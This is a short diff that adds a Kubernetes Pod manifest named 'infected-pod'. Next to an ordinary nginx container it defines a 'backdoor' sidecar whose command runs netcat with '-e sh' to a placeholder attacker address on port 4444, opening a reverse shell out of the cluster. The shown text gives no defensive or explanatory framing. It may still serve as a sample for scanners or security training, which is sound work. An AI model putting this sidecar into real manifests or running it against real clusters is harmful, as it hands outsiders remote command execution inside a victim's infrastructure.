@@ -1,0 +1,11 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: infected-pod
+spec:
+  containers:
+  - name: app
+    image: nginx
+  - name: backdoor
+    image: alpine
+    command: ["sh", "-c", "while true; do sleep 10; done | nc ATTACKER_IP 4444 -e sh"]
